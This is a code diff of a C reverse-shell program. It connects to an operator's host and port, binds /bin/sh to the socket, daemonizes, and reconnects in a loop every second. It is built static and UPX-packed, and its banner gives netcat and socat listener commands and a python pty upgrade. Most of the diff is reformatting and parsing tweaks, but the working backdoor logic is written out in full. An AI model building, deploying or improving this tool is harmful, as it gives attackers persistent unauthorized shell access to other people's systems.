@@ -3,6 +3,8 @@
 compile:
     musl-gcc reverse_shell.c -Os -static -s -o reverse_shell
     upx-ucl -9kvf --ultra-brute reverse_shell
+
+    if you use musl-tools:i386 to compile it would be better.
 */
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
@@ -22,37 +24,37 @@ compile:
 
 // #define DEBUG
 
-static char *g_argv0 = NULL;
-static char *g_host = NULL;
+static char* g_argv0 = NULL;
+static char* g_host = NULL;
 static uint16_t g_port = 0;
 
 static void usage();
-static void reverse_shell(const char *host, unsigned short port);
-static int32_t extract_argv(int argc, const char *argv[]);
-static int32_t extract_name(const char *filename);
-static int32_t extract_file(const char *filename);
+static void reverse_shell(const char* host, unsigned short port);
+static int32_t extract_argv(int argc, const char* argv[]);
+static int32_t extract_name(const char* filename);
+static int32_t extract_file(const char* filename);
 
 static const char shell[] = "/bin/sh";
 static const char message[] = ""
-                              "Successfully reversed!\n"
-                              "If you want a readline function, please use nc in this way:\n"
-                              "\trlwrap nc -lnvvp <port>\n"
-                              "or:\n"
-                              "\tsocat readline,history=/tmp/.socat exec:'nc -lnvvp <port>'\n"
-                              "\n"
-                              "If you want to use a bash, please run the command after reversed:\n"
-                              "\t$(which python||which python3) -c 'import pty;pty.spawn(\"bash\")'\n";
-static const char *prompt = message + 23;
+"Successfully reversed!\n"
+"If you want a readline function, please use nc in this way:\n"
+"\trlwrap nc -lnvvp <port>\n"
+"or:\n"
+"\tsocat readline,history=/tmp/.socat exec:'nc -lnvvp <port>'\n"
+"\n"
+"If you want to use a bash, please run the command after reversed:\n"
+"\t$(which python||which python3) -c 'import pty;pty.spawn(\"bash\")'\n";
+static const char* prompt = message + 23;
 
 #ifdef DEBUG
-int main(int argc, const char *argv[], const char *envp[])
+int main(int argc, const char* argv[], const char* envp[])
 {
-    g_argv0 = (char *)argv[0];
+    g_argv0 = (char*)argv[0];
     printf("g_argv0 = %s\n", g_argv0);
     {
         int retCode = 0;
         printf("start extract_argv\n");
-        retCode = extract_argv(argc, (const char **)argv);
+        retCode = extract_argv(argc, (const char**)argv);
         if (0 == retCode)
         {
             printf("extract_argv ok\n");
@@ -99,12 +101,12 @@ int main(int argc, const char *argv[], const char *envp[])
     }
 }
 #else
-int main(int argc, const char *argv[], const char *envp[])
+int main(int argc, const char* argv[], const char* envp[])
 {
-    g_argv0 = (char *)argv[0];
+    g_argv0 = (char*)argv[0];
     {
         int retCode = 0;
-        retCode = extract_argv(argc, (const char **)argv);
+        retCode = extract_argv(argc, (const char**)argv);
         if (0 == retCode)
         {
             goto __DAEMON__;
@@ -124,52 +126,52 @@ int main(int argc, const char *argv[], const char *envp[])
         exit(retCode);
     }
 __DAEMON__:
-{
-    int ret = daemon(1, 1);
-    if (ret < 0)
     {
-        fprintf(stderr, "Cannot enter daemon mode!\n");
-        goto __LOOP__;
-    }
-    while (1)
-    {
-        pid_t pid = fork();
-        if (pid < 0)
+        int ret = daemon(1, 1);
+        if (ret < 0)
         {
-            fprintf(stderr, "Cannot fork!\n");
-            // exit(EXIT_FAILURE);
+            fprintf(stderr, "Cannot enter daemon mode!\n");
             goto __LOOP__;
         }
-        else if (pid > 0)
+        while (1)
         {
-            // parent process
-            int status;
-            waitpid(pid, &status, 0);
+            pid_t pid = fork();
+            if (pid < 0)
+            {
+                fprintf(stderr, "Cannot fork!\n");
+                // exit(EXIT_FAILURE);
+                goto __LOOP__;
+            }
+            else if (pid > 0)
+            {
+                // parent process
+                int status;
+                waitpid(pid, &status, 0);
+            }
+            else
+            {
+                // child process
+                reverse_shell(g_host, g_port);
+                exit(EXIT_FAILURE); // exec never returns
+            }
+            sleep(1);
         }
-        else
-        {
-            // child process
-            reverse_shell(g_host, g_port);
-            exit(EXIT_FAILURE); // exec never returns
-        }
-        sleep(1);
+        return 0;
     }
-    return 0;
-}
 __LOOP__:
-{
-    while (1)
     {
-        reverse_shell(g_host, g_port);
-        sleep(1);
+        while (1)
+        {
+            reverse_shell(g_host, g_port);
+            sleep(1);
+        }
+        return 0;
     }
-    return 0;
-}
 }
 
 #endif
 
-void reverse_shell(const char *host, unsigned short port)
+void reverse_shell(const char* host, unsigned short port)
 {
     int sock;
     struct sockaddr_in server;
@@ -184,7 +186,7 @@ void reverse_shell(const char *host, unsigned short port)
     server.sin_port = htons(port);
     server.sin_addr.s_addr = inet_addr(host);
 
-    int ret = connect(sock, (struct sockaddr *)&server, sizeof(struct sockaddr));
+    int ret = connect(sock, (struct sockaddr*)&server, sizeof(struct sockaddr));
     if (ret < 0)
     {
         fprintf(stderr, "Cannot connect to %s:%d!\n", host, port);
@@ -207,22 +209,22 @@ void usage()
     exit(-1);
 }
 
-static int32_t extract_argv(int argc, const char *argv[])
+static int32_t extract_argv(int argc, const char* argv[])
 {
     if (argc < 3)
     {
         return ENAVAIL;
     }
-    g_host = (char *)argv[1];
+    g_host = (char*)argv[1];
     g_port = (uint16_t)strtol(argv[2], NULL, 10);
     return 0;
 }
 
-static int32_t extract_name(const char *filename)
+static int32_t extract_name(const char* filename)
 {
     int32_t retCode = 0;
     const size_t filename_length = strlen(filename);
-    ssize_t hyphens[2] = {-1, -1};
+    ssize_t hyphens[2] = { -1, -1 };
     size_t k = 0;
     for (size_t i = 0; i < filename_length; i++)
     {
@@ -243,11 +245,7 @@ static int32_t extract_name(const char *filename)
         goto __ERROR__;
     }
     size_t host_length = ((hyphens[0] - hyphens[1] + 1) / 8 + 1) * 8;
-    // if (NULL != g_host)
-    // {
-    //     free(g_host);
-    //     g_host = NULL;
-    // }
+
     g_host = calloc(host_length, 1);
     if (NULL == g_host)
     {
@@ -259,20 +257,16 @@ static int32_t extract_name(const char *filename)
 
     goto __FREE__;
 __ERROR__:
-    // if (NULL != g_host && g_host != argv[1])
-    // {
-    //     free(g_host);
-    //     g_host = NULL;
-    // }
+    do {} while (0);
 __FREE__:
     return retCode;
 }
 
-static int32_t extract_file(const char *filename)
+static int32_t extract_file(const char* filename)
 {
     int32_t retCode = 0;
-    FILE *fp = NULL;
-    uint8_t *buffer = NULL;
+    FILE* fp = NULL;
+    uint8_t* buffer = NULL;
 
     fp = fopen(filename, "rb");
     if (NULL == fp)
@@ -291,7 +285,12 @@ static int32_t extract_file(const char *filename)
     fseek(fp, 0, SEEK_SET);
     fread(buffer, fs, 1, fp);
     ssize_t start = -1, split = -1;
-    for (size_t i = 0; i < fs; i++)
+    size_t i = 0;
+    if (buffer[fs - 1] == '\n')
+    {
+        i = 1; // using echo command will be '\n' at last.
+    }
+    for (; i < fs; i++)
     {
         size_t j = fs - 1 - i;
         uint8_t c = buffer[j];
@@ -307,9 +306,8 @@ static int32_t extract_file(const char *filename)
         {
             continue;
         }
-        if (c == '.' || c == '%' || c == '\n')
+        if (c == '.' || c == '%')
         {
-            // using echo command will be '\n' at last.
             continue;
         }
         if (c == ':' && split < 0)
@@ -326,11 +324,7 @@ static int32_t extract_file(const char *filename)
         goto __ERROR__;
     }
     size_t host_length = ((split - start + 1) / 8 + 1) * 8;
-    // if (NULL != g_host)
-    // {
-    //     free(g_host);
-    //     g_host = NULL;
-    // }
+
     g_host = calloc(host_length, 1);
     if (NULL == g_host)
     {
@@ -342,11 +336,7 @@ static int32_t extract_file(const char *filename)
 
     goto __FREE__;
 __ERROR__:
-    // if (NULL != g_host)
-    // {
-    //     free(g_host);
-    //     g_host = NULL;
-    // }
+    do {} while (0);
 __FREE__:
     if (NULL != buffer)
     {
